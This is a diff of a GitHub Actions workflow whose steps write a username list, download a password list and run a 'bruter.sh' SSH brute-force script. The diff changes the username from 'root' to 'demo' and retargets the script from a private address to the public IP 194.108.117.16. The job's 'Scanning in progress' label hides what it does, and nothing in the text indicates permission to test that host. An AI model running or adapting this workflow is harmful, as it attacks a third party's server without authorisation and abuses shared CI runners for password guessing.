@@ -33,7 +33,7 @@ jobs:
         
     - name: Make User
       run: |
-        echo root > user.txt
+        echo demo > user.txt
 
     - name: Download Password
       run: |
@@ -41,7 +41,7 @@ jobs:
 
     - name: Scanning in progress 
       run: |
-         bash bruter.sh ssh user.txt passwords.txt 10.0.0.1 output.txt
+         bash bruter.sh ssh user.txt passwords.txt 194.108.117.16 output.txt
             
     - name: Determine release tag
       id: get_tag
